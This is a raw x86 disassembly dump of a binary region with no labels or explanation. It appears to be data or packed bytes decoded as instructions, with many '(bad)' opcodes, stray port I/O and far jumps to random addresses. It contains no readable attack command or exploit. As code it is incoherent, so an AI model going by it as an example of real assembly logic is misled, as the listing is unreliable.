  42d62a:	xchg   DWORD PTR [ebp+0x37b1d91a],eax
  42d630:	and    dh,BYTE PTR [esi+0xe934a4]
	...
  42d696:	repz add esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0xd6868d59
  42d6a4:	clc    
  42d6a5:	sub    ebx,DWORD PTR [ebp-0x1a]
  42d6a8:	add    DWORD PTR [eax],eax
  42d6aa:	pop    es
  42d6ab:	add    DWORD PTR [eax],eax
  42d6ad:	add    BYTE PTR [ebp+edi*2-0x4eddcd9b],al
  42d6b4:	jno    0x42d704
  42d6b6:	xchg   ebx,eax
  42d6b7:	mov    cl,0xb5
  42d6b9:	xor    bh,0xd6
  42d6bc:	out    dx,eax
  42d6bd:	mov    ebp,0xec185ad0
  42d6c2:	loopne 0x42d6d9
  42d6c4:	js     0x42d658
  42d6c6:	dec    esi
  42d6c7:	dec    edx
  42d6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d6c9:	cli    
  42d6ca:	loopne 0x42d718
  42d6cc:	add    edi,DWORD PTR [esi]
  42d6ce:	ret    
  42d6cf:	jnp    0x42d661
  42d6d1:	push   es
  42d6d2:	mov    DWORD PTR [ecx+0x59b7456a],ebx
  42d6d8:	ins    DWORD PTR es:[edi],dx
  42d6d9:	in     eax,dx
  42d6da:	or     dh,0xf1
  42d6dd:	stos   DWORD PTR es:[edi],eax
  42d6de:	mov    dl,0x75
  42d6e0:	(bad)  
  42d6e1:	xchg   esp,eax
  42d6e2:	aad    0x9a
  42d6e4:	jecxz  0x42d67d
  42d6e6:	inc    eax
  42d6e7:	jbe    0x9992bf95
  42d6ed:	xor    BYTE PTR [ecx],0x46
  42d6f0:	push   0xffffff81
  42d6f2:	lods   eax,DWORD PTR ds:[esi]
  42d6f3:	mov    ds:0xbbfef5ed,al
  42d6f8:	or     ecx,DWORD PTR [edx+0x743bb1cf]
  42d6fe:	pushf  
  42d6ff:	outs   dx,DWORD PTR ds:[esi]
  42d700:	jb     0x42d724
  42d702:	dec    eax
  42d703:	loope  0x42d6fc
  42d705:	push   ebp
  42d706:	stc    
  42d707:	int    0x70
  42d709:	aas    
  42d70a:	push   ds
  42d70b:	rcr    BYTE PTR [ebx-0x21],1
  42d70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d70f:	and    esi,DWORD PTR [edx-0x25ba24ce]
  42d715:	push   ds
  42d716:	pop    es
  42d717:	div    DWORD PTR [edx+ebx*1+0x3a]
  42d71b:	test   DWORD PTR [edx],ebp
  42d71d:	in     al,0xd3
  42d71f:	add    eax,0xefedf4a2
  42d724:	popa   
  42d725:	jecxz  0x42d754
  42d727:	into   
  42d728:	push   ebx
  42d729:	mov    esi,0x61a3d4c3
  42d72e:	or     DWORD PTR [ecx],esi
  42d730:	pop    es
  42d731:	push   es
  42d732:	mov    esp,0x6755f4b6
  42d737:	pushf  
  42d738:	xchg   edx,eax
  42d739:	(bad)  
  42d73b:	mov    ebp,0x37f1563f
  42d740:	sbb    DWORD PTR [edx],ebp
  42d742:	daa    
  42d743:	add    BYTE PTR [edi+0x67],cl
  42d746:	clc    
  42d747:	push   ecx
  42d748:	jae    0x42d729
  42d74a:	mov    BYTE PTR [esi],al
  42d74c:	push   eax
  42d74d:	jmp    0xcdca6c21
  42d752:	sub    al,0x65
  42d754:	mov    ebp,0x63c7add9
  42d759:	jno    0x42d788
  42d75b:	(bad)  
  42d75c:	icebp  
  42d75d:	and    edi,edx
  42d75f:	imul   esp,DWORD PTR [ecx-0x713e6d9e],0xffffffe2
  42d766:	xchg   ecx,eax
  42d767:	ret    
  42d768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d769:	xchg   ecx,eax
  42d76a:	xor    edi,esp
  42d76c:	fdivr  DWORD PTR [eax]
  42d76e:	nop
  42d76f:	jae    0xb09e13b1
  42d775:	jl     0x42d7a9
  42d777:	rcl    DWORD PTR [eax-0x369353be],0x78
  42d77e:	in     eax,0xe1
  42d780:	xlat   BYTE PTR ds:[ebx]
  42d781:	clc    
  42d782:	and    BYTE PTR [ecx-0x4],ch
  42d785:	jmp    0xfbf1:0x64b62464
  42d78c:	adc    BYTE PTR [esi+eax*4+0x5a0ae628],ah
  42d793:	cmp    al,BYTE PTR [esi-0x1f]
  42d796:	mov    eax,ds:0xb5a8bae1
  42d79b:	ret    
  42d79c:	sub    edx,DWORD PTR [esi-0x76]
  42d79f:	int    0x3f
  42d7a1:	cmp    edi,DWORD PTR [edx+ecx*8]
  42d7a4:	(bad)  
  42d7a5:	test   al,0x26
  42d7a7:	push   eax
  42d7a8:	mov    ebp,0x112dff95
  42d7ad:	gs aaa 
  42d7af:	lahf   
  42d7b0:	mov    eax,0x4b173626
	...
  42d815:	add    BYTE PTR [esi-0x62a06765],dl
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0xa94b1795
  42d825:	mov    esp,DWORD PTR [edi+eiz*8+0x1]
  42d829:	add    BYTE PTR [edi],al
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    BYTE PTR [ebx-0x46b0519c],bl
  42d833:	xor    ah,0x7c
  42d836:	retf   
  42d837:	push   esp
  42d838:	and    DWORD PTR [ecx+0x20a6d723],ecx
  42d83e:	test   BYTE PTR [edx+ebx*8],cl
  42d841:	push   edi
  42d842:	mov    cl,0xe5
  42d844:	aad    0x28
  42d846:	je     0x42d8b9
  42d848:	xor    dl,BYTE PTR [ebp+0x4f51e5d1]
  42d84e:	cmp    edi,DWORD PTR [edi]
  42d850:	retf   0xf1b1
  42d853:	push   ss
  42d854:	out    dx,al
  42d855:	shr    DWORD PTR [edx+0x369f2d9c],1
  42d85b:	add    ebx,esi
  42d85d:	mov    ds:0x8616a8d,al
  42d862:	and    dh,BYTE PTR [eax]
  42d864:	out    dx,al
  42d865:	or     cl,dh
  42d867:	nop
  42d868:	int    0xfd
  42d86a:	add    esi,edx
  42d86c:	shr    ebp,1
  42d86e:	sahf   
  42d86f:	sub    BYTE PTR [esi+ecx*8+0x60161c07],bh
  42d876:	repnz jmp 0x19ed:0xa7ccb4a2
  42d87e:	jg     0x42d847
  42d880:	or     bh,bh
  42d882:	fbstp  TBYTE PTR [edx+0x7c]
  42d885:	popa   
  42d886:	inc    ebp
  42d887:	dec    eax
  42d888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d889:	les    esi,FWORD PTR [edx+0x574b090a]
  42d88f:	push   ss
  42d890:	mov    esp,ebx
  42d892:	pop    esi
  42d893:	or     eax,DWORD PTR [esi+ecx*8-0x41]
  42d897:	or     al,0x75
  42d899:	cmp    BYTE PTR [edx-0x6f1eafe6],dl
  42d89f:	in     al,dx
  42d8a0:	inc    esp
  42d8a1:	pop    es
  42d8a2:	push   0xf26e9430
  42d8a7:	sbb    al,BYTE PTR [esi*1-0xaee7cf4]
  42d8ae:	adc    eax,DWORD PTR [edi]
  42d8b0:	clc    
  42d8b1:	je     0x42d8ce
  42d8b3:	gs in  al,dx
  42d8b5:	push   0x5ac29eba
  42d8ba:	cmp    BYTE PTR [eax-0x4e3ce5f0],ah
  42d8c0:	push   ds
  42d8c1:	mov    ebx,DWORD PTR [ebx+0x21393ce7]
  42d8c7:	out    0x58,eax
  42d8c9:	sbb    al,0x4d
  42d8cb:	xchg   edi,eax
  42d8cc:	in     al,dx
  42d8cd:	retf   0xe7c3
  42d8d0:	cwde   
  42d8d1:	sahf   
  42d8d2:	in     al,0xa6
  42d8d4:	out    dx,eax
  42d8d5:	fist   WORD PTR [edx]
  42d8d7:	fadd   DWORD PTR [ecx+0xd40eaee]
  42d8dd:	ror    eax,cl
  42d8df:	loop   0x42d93d
  42d8e1:	sbb    BYTE PTR [esi],al
  42d8e3:	leave  
  42d8e4:	(bad)  
  42d8e5:	mov    al,0x5
  42d8e7:	jmp    0x42d93b
  42d8e9:	pop    edx
  42d8ea:	and    cl,BYTE PTR [edi-0x70]
  42d8ed:	xchg   DWORD PTR ds:0xe4b8f57f,esi
  42d8f3:	popa   
  42d8f4:	jle    0x42d8b6
  42d8f6:	sbb    eax,0xef966945
  42d8fb:	push   eax
  42d8fc:	mov    ds:0xa6359c43,eax
  42d901:	xor    dl,BYTE PTR [edx+0x6f84b30f]
  42d907:	cdq    
  42d908:	(bad)  
  42d909:	fild   DWORD PTR [ecx-0x30]
  42d90c:	fnsave [ebp+0x8daf2e9]
  42d912:	pop    es
  42d913:	aam    0x4
  42d915:	add    BYTE PTR [edx+eiz*4+0x6f361658],al
  42d91c:	in     eax,0x79
  42d91e:	push   es
  42d91f:	cmp    bl,BYTE PTR ds:0x96bb209c
  42d925:	adc    esi,DWORD PTR [ecx+0x52]
  42d928:	mov    al,ds:0xc6ac0943
  42d92d:	sub    BYTE PTR [ecx],0x36
  42d930:	xchg   ebp,edi
  42d932:	mov    esp,0x8962
	...
  42d993:	add    BYTE PTR [eax],al
  42d995:	add    cl,bh
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0x86e80714,ecx
  42d9a5:	sbb    ebp,DWORD PTR [ebx-0x18]
  42d9a8:	add    DWORD PTR [eax],eax
  42d9aa:	pop    es
  42d9ab:	add    DWORD PTR [eax],eax
  42d9ad:	add    BYTE PTR [edx+ecx*2+0x4c],cl
  42d9b1:	mov    BYTE PTR [ebx-0x539deffe],dh
  42d9b7:	xor    al,BYTE PTR [ebx+0x27]
  42d9ba:	pop    ecx
  42d9bb:	xchg   ebx,eax
  42d9bc:	push   0xffffff82
  42d9be:	jb     0x42d960
  42d9c0:	cs mov esi,0xf629800e
  42d9c6:	sahf   
  42d9c7:	sub    DWORD PTR [edi+0x13f6bc76],0x5f
  42d9ce:	pusha  
  42d9cf:	pop    ebx
  42d9d1:	test   dh,dl
  42d9d3:	or     edi,esp
  42d9d5:	cld    
  42d9d6:	mov    ebp,0xb6aaf79a
  42d9db:	jo     0x42d967
  42d9dd:	xchg   edi,eax
  42d9de:	call   0xc291:0x755edb2f
  42d9e5:	fwait
  42d9e6:	enter  0x2f1d,0xb2
  42d9ea:	call   0xd22b50a7
  42d9ef:	lods   al,BYTE PTR ds:[esi]
  42d9f0:	repz dec ecx
  42d9f2:	jmp    FWORD PTR [esi-0x5db4b6e1]
  42d9f8:	in     al,dx
  42d9f9:	nop
  42d9fa:	aaa    
  42d9fb:	mov    cl,0x75
  42d9fd:	mov    dh,0x78
  42d9ff:	pop    ds
  42da00:	fmul   DWORD PTR [esp+edx*1]
  42da03:	ins    DWORD PTR es:[edi],dx
  42da04:	daa    
  42da05:	das    
  42da06:	js     0x42d9fc
  42da08:	fcomp  st(0)
  42da0a:	mov    al,0x72
  42da0c:	clc    
  42da0d:	mov    WORD PTR [eax+eax*1-0x5d7b9df4],gs
  42da14:	or     eax,0x518a46c4
  42da19:	test   eax,0x9d26cb78
  42da1e:	or     esi,edi
  42da20:	icebp  
  42da21:	sbb    edi,DWORD PTR [ebp+eax*2-0x4f]
  42da25:	in     al,0x28
  42da27:	cmp    eax,0x61032ad2
  42da2c:	pusha  
  42da2d:	cdq    
  42da2e:	or     esp,0x2
  42da31:	paddb  mm4,QWORD PTR [eax+0x172adf5a]
  42da38:	out    0x9a,eax
  42da3a:	into   
  42da3b:	sar    BYTE PTR [edi+0x3d33a940],0xf5
  42da42:	call   0xe7c0:0xec33956c
  42da49:	call   0x2556:0x1857021f
  42da50:	icebp  
  42da51:	stos   DWORD PTR es:[edi],eax
  42da52:	sbb    DWORD PTR [edi-0x29],0xc7ee61fa
  42da59:	xor    al,0xbc
  42da5b:	(bad)  
  42da5c:	dec    ebp
  42da5d:	repnz pop ebx
  42da5f:	dec    edi
  42da60:	dec    edi
  42da61:	jb     0x42d9fe
  42da63:	mov    bl,BYTE PTR [ebx-0x3a]
  42da66:	(bad)  
  42da67:	mov    ss,WORD PTR [edi+0x3b48f4f8]
  42da6d:	push   esp
  42da6e:	and    DWORD PTR [edi+0x32],ecx
  42da71:	jmp    0xc938:0xd2cda8fa
  42da78:	mov    BYTE PTR [ecx-0x4ad1c501],0xcb
  42da7f:	mov    al,ds:0x879a8d3c
  42da84:	and    al,0x6e
  42da86:	mov    cl,BYTE PTR [ecx-0x43d4ba6c]
  42da8c:	cmp    al,0x3d
  42da8e:	sub    al,0x9b
  42da90:	sub    dh,bl
  42da92:	lods   eax,DWORD PTR ds:[esi]
  42da93:	sbb    eax,0x1e234ffb
  42da98:	or     bh,ah
  42da9a:	pop    ss
  42da9b:	fs cmp esp,edx
  42da9e:	jle    0x42da65
  42daa0:	dec    eax
  42daa1:	xchg   edx,eax
  42daa2:	icebp  
  42daa3:	aam    0xcd
  42daa5:	(bad)  
  42daa7:	mov    BYTE PTR [ebx],cl
  42daa9:	data16 das 
  42daab:	mov    WORD PTR [edx*4+0x67b67b2f],fs
  42dab2:	shufps xmm2,XMMWORD PTR [ecx+0x0],0x0
	...
  42db13:	add    BYTE PTR [eax],al
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42dade
  42db23:	dec    edi
  42db24:	xlat   BYTE PTR ds:[ebx]
  42db25:	adc    al,0x72
  42db27:	jmp    0x149db2d
  42db2c:	add    BYTE PTR [eax],al
  42db2e:	mov    edx,DWORD PTR [ebp+0x69]
  42db31:	pop    edx
  42db32:	pop    ebx
  42db33:	adc    al,0xde
  42db35:	jecxz  0x42db07
  42db37:	or     ecx,DWORD PTR [esi]
  42db39:	push   ss
  42db3a:	and    edx,DWORD PTR [edx-0x41]
  42db3d:	fwait
  42db3e:	pop    edi
  42db3f:	xor    edx,edx
  42db41:	aam    0xfb
  42db43:	bnd jae 0x42db17
  42db46:	es push 0xb44c7320
  42db4c:	imul   ecx,DWORD PTR [ebp+0x3a],0x46a66c9d
  42db53:	jp     0x42daed
  42db55:	inc    edi
  42db56:	jp     0x42db25
  42db58:	dec    ecx
  42db59:	xchg   edi,eax
  42db5a:	or     DWORD PTR [esp+ecx*8-0x1ca47fbe],edi
  42db61:	sub    eax,DWORD PTR [ebp+0x763bd7c6]
  42db67:	in     al,0xde
  42db69:	lds    edx,FWORD PTR [edi]
  42db6b:	mov    bl,0x89
  42db6d:	adc    DWORD PTR [edx],esi
  42db6f:	sub    al,0x87
  42db71:	cmp    DWORD PTR [edi+ecx*2+0x28],eax
  42db75:	out    dx,al
  42db76:	cmp    al,0xd4
  42db78:	gs jne 0x42db23
  42db7b:	es retf 
  42db7d:	sti    
  42db7e:	push   edx
  42db7f:	out    0xbf,eax
  42db81:	mov    al,ds:0xaaea76d0
  42db86:	aam    0x95
  42db88:	adc    ch,BYTE PTR [edx]
  42db8a:	fldcw  WORD PTR [ecx]
  42db8c:	cld    
  42db8d:	inc    ebx
  42db8e:	push   esp
  42db8f:	shr    DWORD PTR [edx-0x6f],0x8
  42db93:	not    BYTE PTR [edi]
  42db95:	jae    0x42db8c
  42db97:	outs   dx,BYTE PTR ds:[esi]
  42db98:	mov    dl,0xaa
  42db9a:	xchg   esi,eax
  42db9b:	xor    BYTE PTR [esi-0x67588041],0xfb
  42dba2:	das    
  42dba3:	sbb    BYTE PTR [ebp-0x5c],cl
  42dba6:	xchg   DWORD PTR [ecx+esi*8-0x75e38cdc],ebx
  42dbad:	inc    edx
  42dbae:	(bad)  
  42dbaf:	nop
  42dbb0:	ins    DWORD PTR es:[edi],dx
  42dbb1:	lds    esp,FWORD PTR [edx+0x62c583ea]
  42dbb7:	mov    ch,0x84
  42dbb9:	jge    0x42db49
  42dbbb:	push   0x8e9a3776
  42dbc0:	rcr    ebp,1
  42dbc2:	in     al,dx
  42dbc3:	pop    es
  42dbc4:	test   BYTE PTR [ebp*1-0x367589b5],cl
  42dbcb:	arpl   WORD PTR [ebx+0x26043fba],ax
  42dbd1:	popa   
  42dbd2:	mov    ecx,0xc4df91e0
  42dbd7:	ret    
  42dbd8:	fcomp  st(4)
  42dbda:	loop   0x42dc33
  42dbdc:	dec    ecx
  42dbde:	sbb    ebp,ebx
  42dbe0:	outs   dx,BYTE PTR ds:[esi]
  42dbe1:	clc    
  42dbe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbe3:	(bad)  [ecx+0x33]
  42dbe6:	std    
  42dbe7:	pop    ebp
  42dbe8:	out    dx,eax
  42dbe9:	int3   
  42dbea:	outs   dx,BYTE PTR ds:[esi]
  42dbeb:	repnz stos BYTE PTR es:[edi],al
  42dbed:	pop    ecx
  42dbee:	xor    al,0x4
  42dbf0:	push   ds
  42dbf1:	popa   
  42dbf2:	jecxz  0x42dc10
  42dbf4:	mul    ebx
  42dbf6:	outs   dx,DWORD PTR ds:[esi]
  42dbf7:	cmp    ch,BYTE PTR [ebx-0x33bcb9ed]
  42dbfd:	sbb    BYTE PTR [eax],bl
  42dbff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc00:	add    al,0x4
  42dc02:	push   edi
  42dc04:	inc    ecx
  42dc05:	(bad)  
  42dc06:	ss and eax,0xec6b530c
  42dc0c:	adc    BYTE PTR [eax+0x38],dl
  42dc0f:	sbb    al,0xda
  42dc11:	(bad)  
  42dc12:	adc    BYTE PTR [esi+0x44],dh
  42dc15:	call   0xf671:0x1d1cadf4
  42dc1c:	jnp    0x42dc83
  42dc1e:	fs xor al,0x4d
  42dc21:	mov    ecx,0xa75eb5f4
  42dc26:	cmp    al,0xdc
  42dc28:	sahf   
  42dc29:	popa   
  42dc2a:	jmp    0xb9b1:0x5844e6aa
  42dc31:	sub    esp,DWORD PTR [eax+0xa9b7]
	...
  42dc93:	add    BYTE PTR [eax],al
  42dc95:	add    BYTE PTR [ecx],bh
  42dc97:	mov    bh,0x6d
  42dc99:	pxor   mm3,mm7
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0x4fe9f285
  42dca4:	and    ebp,esp
  42dca6:	jns    0x42dc92
  42dca8:	add    DWORD PTR [eax],eax
  42dcaa:	pop    es
  42dcab:	add    DWORD PTR [eax],eax
  42dcad:	add    BYTE PTR [eax],dl
  42dcaf:	rcl    DWORD PTR ds:0xc4322786,0x4b
  42dcb6:	std    
  42dcb7:	in     al,0x4d
  42dcb9:	xor    BYTE PTR ds:0x29c99df0,ch
  42dcbf:	add    al,0x87
  42dcc1:	mov    edi,0xb92fce05
  42dcc6:	xchg   BYTE PTR [eax+0xc],dh
  42dcc9:	cmc    
  42dcca:	pop    ds
  42dccb:	cmp    ah,dl
  42dccd:	jae    0x42dc50
  42dccf:	(bad)  
  42dcd0:	ss pop edi
  42dcd2:	adc    bl,BYTE PTR [esi-0x51aefe19]
  42dcd8:	inc    esp
  42dcd9:	pop    ebx
  42dcda:	repnz aam 0x6
  42dcdd:	out    0xb7,eax
  42dcdf:	push   edx
  42dce0:	cdq    
  42dce1:	mov    dl,0x21
  42dce3:	dec    edi
  42dce4:	mov    ah,0x11
  42dce6:	rcr    dl,cl
  42dce8:	cmp    al,0x8e
  42dcea:	sbb    eax,0x4dd44182
  42dcef:	loop   0x42dca6
  42dcf1:	xchg   ebx,eax
  42dcf2:	and    BYTE PTR [eax+0x40],bh
  42dcf5:	arpl   WORD PTR [eax-0x21ba0288],bp
  42dcfb:	push   0x51
  42dcfd:	inc    ecx
  42dcfe:	fild   QWORD PTR [esi]
  42dd00:	push   ebp
  42dd01:	ret    0x6091
  42dd04:	test   eax,0x5572f64d
  42dd09:	loop   0x42dc8d
  42dd0b:	xor    BYTE PTR [esp+ebx*8],dl
  42dd0e:	dec    ebx
  42dd0f:	adc    DWORD PTR [edi+0x33],esp
  42dd12:	arpl   WORD PTR [ecx-0x792eee31],ax
  42dd18:	rcr    edx,0xbf
  42dd1b:	sti    
  42dd1c:	imul   ebp,DWORD PTR [ecx-0x53],0xfffffff6
  42dd20:	call   0x198f71
  42dd25:	push   dx
  42dd27:	sbb    ebp,eax
  42dd29:	push   0x4c8bb8d2
  42dd2e:	hlt    
  42dd2f:	les    edi,FWORD PTR ds:0x84334c3d
  42dd35:	cmp    bl,BYTE PTR [edi+0x3]
  42dd38:	sti    
  42dd39:	xchg   esi,eax
  42dd3a:	lea    ebx,[ebx-0x24]
  42dd3d:	mov    dl,0x2
  42dd3f:	push   edi
  42dd40:	jl     0x42dd76
  42dd42:	push   ds
  42dd43:	arpl   WORD PTR [ebx+0x19a318f6],bx
  42dd49:	addr16 xor al,0x4b
  42dd4c:	out    dx,al
  42dd4d:	scas   eax,DWORD PTR es:[edi]
  42dd4e:	jbe    0x42dda8
  42dd50:	aas    
  42dd51:	int3   
  42dd52:	ss jns 0x42dd72
  42dd55:	sub    esi,ecx
  42dd57:	repnz pop es
  42dd59:	mov    WORD PTR [edx-0x56b1012f],gs
  42dd5f:	dec    edi
  42dd60:	push   ss
  42dd61:	push   ss
  42dd62:	(bad)  
  42dd63:	popf   
  42dd64:	inc    ebp
  42dd65:	mov    esi,0x89617983
  42dd6a:	dec    edi
  42dd6b:	in     al,0xcd
  42dd6d:	scas   al,BYTE PTR es:[edi]
  42dd6e:	cmp    al,cl
  42dd70:	movd   ebx,mm7
  42dd73:	ins    DWORD PTR es:[edi],dx
  42dd74:	mov    ch,0xe4
  42dd76:	sbb    DWORD PTR [edx-0xd],ecx
  42dd79:	inc    esp
  42dd7a:	in     eax,0x7c
  42dd7c:	cli    
  42dd7d:	sbb    cl,BYTE PTR [edx+eax*4+0x6f]
  42dd81:	imul   ecx,edi,0x8
  42dd84:	dec    DWORD PTR [ebx]
  42dd86:	in     al,dx
  42dd87:	push   eax
  42dd88:	popf   
  42dd89:	dec    edx
  42dd8a:	sub    eax,0x33f4610d
  42dd8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd90:	jle    0x42dd7e
  42dd92:	stc    
  42dd93:	jo     0x42dd47
  42dd95:	adc    BYTE PTR [ebx+0x1c72ebdb],0x86
  42dd9c:	imul   ebp,DWORD PTR [edx+esi*4-0x71f1e04e],0x3e
  42dda4:	cdq    
  42dda5:	and    ebx,0x7ab2e89a
  42ddab:	push   ecx
  42ddac:	cwde   
  42ddad:	cs cmp ecx,esi
  42ddb0:	das    
  42ddb1:	lods   eax,DWORD PTR ds:[esi]
  42ddb2:	mov    ebx,0x3e31
	...
  42de13:	add    BYTE PTR [eax],al
  42de15:	add    dh,ah
  42de17:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0xf06a3d07
  42de25:	xchg   BYTE PTR [eax+0x70001eb],al
  42de2b:	add    DWORD PTR [eax],eax
  42de2d:	add    BYTE PTR ds:0xff6355b8,ch
  42de33:	lock inc ebp
  42de35:	into   
  42de36:	add    ebx,edx
  42de38:	push   0xffffffeb
  42de3a:	xchg   ecx,eax
  42de3b:	adc    eax,0x45ef6cc8
  42de40:	push   esp
  42de41:	xchg   edx,eax
  42de42:	jge    0x42de6b
  42de44:	cmp    al,BYTE PTR [eax-0x7f74c50]
  42de4a:	fcomp  DWORD PTR [ecx+edx*4+0x7e]
  42de4e:	(bad)  
  42de4f:	cld    
  42de50:	je     0x42ddeb
  42de52:	dec    edx
  42de53:	push   DWORD PTR [edx+ebp*8+0x67]
  42de57:	sub    DWORD PTR [ebx-0x7cc1969c],ecx
  42de5d:	push   0xeb55dd7a
  42de62:	rol    eax,0x3
  42de65:	cmp    DWORD PTR [esi-0x41],ecx
  42de68:	rol    edx,1
  42de6a:	shl    cl,cl
  42de6c:	loop   0x42de88
  42de6e:	(bad)  
  42de6f:	retf   
  42de70:	xor    eax,0xc0c89f07
  42de75:	pop    ebx
  42de76:	xor    eax,0x4f8f8dee
  42de7b:	imul   DWORD PTR [eax-0x68]
  42de7e:	lods   eax,DWORD PTR ds:[esi]
  42de7f:	fsubr  DWORD PTR ds:0x3dff95a1
  42de85:	data16 out dx,al
  42de87:	cwde   
  42de88:	mov    ebp,0xef6906d9
  42de8d:	loopne 0x42de17
  42de8f:	imul   ecx,DWORD PTR [edx],0xffffff8b
  42de92:	mov    DWORD PTR [esi],ecx
  42de94:	pop    esp
  42de95:	xor    al,0x6d
  42de97:	in     al,dx
  42de98:	shl    DWORD PTR [ebx+0x451c2227],1
  42de9e:	pop    esp
  42de9f:	push   es
  42dea0:	cmp    esp,eax
  42dea2:	mov    esp,0x8bd87ca
  42dea7:	call   0x1e5d568
  42deac:	jbe    0x42df17
  42deae:	xor    ebp,DWORD PTR [esi+0x41c40a3]
  42deb4:	xchg   BYTE PTR [edx],al
  42deb6:	les    ebp,FWORD PTR [edx+ebp*2+0x19]
  42deba:	jmp    0x9fe7:0x4b4d776b
  42dec1:	enter  0x7772,0xf
  42dec5:	mov    eax,ebx
  42dec7:	stc    
  42dec8:	test   BYTE PTR [edx-0x7b902c9c],ah
  42dece:	dec    edi
  42decf:	leave  
  42ded0:	jno    0x42de96
  42ded2:	mov    edi,DWORD PTR [esi]
  42ded4:	sub    al,0xa5
  42ded6:	stc    
  42ded7:	push   ecx
  42ded8:	push   edx
  42ded9:	cdq    
  42deda:	adc    eax,0xeb1c296f
  42dedf:	push   0xf756e833
  42dee4:	retf   0x9c4
  42dee7:	rol    BYTE PTR [eax-0x2e0c93ca],1
  42deed:	xchg   edx,eax
  42deee:	xchg   ebp,eax
  42deef:	cmp    DWORD PTR [edi+0x4c],ebp
  42def2:	mov    BYTE PTR [ecx+0x38ccca57],al
  42def8:	rcr    DWORD PTR [esi-0x3a],cl
  42defb:	mov    ecx,0xb2bab848
  42df00:	xor    bl,BYTE PTR [esi]
  42df02:	cmp    eax,0xd8567f3d
  42df07:	popa   
  42df08:	shl    bh,cl
  42df0a:	(bad)  
  42df0b:	enter  0x8dfd,0x3
  42df0f:	push   0x243f4c5
  42df14:	cld    
  42df15:	add    al,0x56
  42df17:	fwait
  42df18:	leave  
  42df19:	xchg   ebx,eax
  42df1a:	mov    ecx,0x3adb948b
  42df1f:	mov    al,0x82
  42df21:	and    eax,0xb9e349ad
  42df26:	jo     0x42df26
  42df28:	push   ebx
  42df2a:	test   eax,0xf5e5a386
  42df2f:	jmp    0x42deca
  42df31:	xor    edi,DWORD PTR [ecx+0xac97]
	...
  42df93:	add    BYTE PTR [eax],al
  42df95:	add    BYTE PTR [edx],al
  42df97:	(bad)  
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	aas    
  42dfa3:	pop    es
  42dfa4:	std    
  42dfa5:	loope  0x42df2e
  42dfa7:	in     al,dx
  42dfa8:	add    DWORD PTR [eax],eax
  42dfaa:	pop    es
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    BYTE PTR [ebx-0x6c],dh
  42dfb0:	ficom  WORD PTR [esp+eiz*2-0x11]
  42dfb4:	ds mov ah,0x50
  42dfb7:	sahf   
  42dfb8:	loop   0x42dfa2
  42dfba:	outs   dx,BYTE PTR ds:[esi]
  42dfbb:	into   
  42dfbc:	js     0x42dfd4
  42dfbe:	inc    edi
  42dfbf:	dec    edx
  42dfc0:	xor    BYTE PTR [ecx-0x55],bl
  42dfc3:	sti    
  42dfc4:	and    cl,BYTE PTR [edx+0x793108c0]
  42dfca:	cmp    BYTE PTR [ecx+0x1809cbdf],ah
  42dfd0:	add    ebp,edx
  42dfd2:	push   ss
  42dfd3:	sub    al,BYTE PTR [eax+ecx*8]
  42dfd6:	sti    
  42dfd7:	repnz iret 
  42dfd9:	mov    esp,0x72a00435
  42dfde:	mov    al,ds:0x993ea82b
  42dfe3:	je     0x42e04a
  42dfe5:	outs   dx,BYTE PTR ds:[esi]
  42dfe6:	mov    ds:0x909609d6,al
  42dfeb:	inc    ebp
  42dfec:	fcomi  st,st(2)
  42dfee:	inc    ecx
  42dfef:	pop    esp
  42dff0:	mov    ecx,0x4ed046f3
  42dff5:	cmp    edx,DWORD PTR [edi-0x53ee988c]
  42dffb:	jmp    0x42dfee
  42dffd:	clc    
  42dffe:	pop    ss
  42dfff:	push   esp
  42e000:	hlt    
  42e001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e003:	jp     0x42e059
  42e005:	lea    ecx,[esi-0x20]
  42e008:	(bad)  
  42e009:	xchg   esp,eax
  42e00a:	jmp    0x42dfeb
  42e00c:	sub    edx,DWORD PTR [eax*2+0xd6fb1f2]
  42e013:	add    esp,DWORD PTR [ecx+eiz*4-0x3993fe14]
  42e01a:	push   ebp
  42e01b:	mov    ?,WORD PTR [ebx+0x15327783]
  42e021:	mov    bl,0x1a
  42e023:	xlat   BYTE PTR ds:[ebx]
  42e024:	mov    edi,0x5c1113a1
  42e029:	xchg   BYTE PTR [esi+0x18],bl
  42e02c:	ins    BYTE PTR es:[edi],dx
  42e02d:	sti    
  42e02e:	ficom  DWORD PTR [eax+0x64]
  42e031:	fst    st(5)
  42e033:	pushf  
  42e034:	jnp    0x42e04a
  42e036:	rep outs dx,BYTE PTR ds:[esi]
  42e038:	stos   BYTE PTR es:[edi],al
  42e039:	aam    0x89
  42e03b:	pop    ss
  42e03c:	ja     0x42e093
  42e03e:	sub    dl,BYTE PTR ss:[esi+ebp*8]
  42e042:	jecxz  0x42e071
